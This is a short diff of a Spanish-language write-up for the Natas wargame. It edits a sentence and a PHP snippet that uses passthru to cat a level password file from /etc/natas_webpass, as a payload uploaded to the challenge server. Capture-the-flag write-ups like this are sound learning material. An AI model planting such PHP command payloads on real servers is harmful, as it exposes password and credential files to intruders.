@@ -233,11 +233,11 @@ Sabemos que la contraseña estará en la siguiente ubicación, por los niveles a
 cat /etc/natas_webpass/natas12
 ```
 
-Por alguna razón no me deja ejecutar los comandos que le paso desde el navegador así que modifico directamente el código para que me muestre la contraseña del siguiente nivel.
+Por alguna razón no me deja ejecutar los comandos que le paso desde el navegador así que modifico directamente el código para que me muestre la contraseña del siguiente **nivel13**.
 
 ```php
 <?php
- passthru("cat /etc/natas_webpass/natas12");  
+ passthru("cat /etc/natas_webpass/natas13");  
 ?>
 ```
 
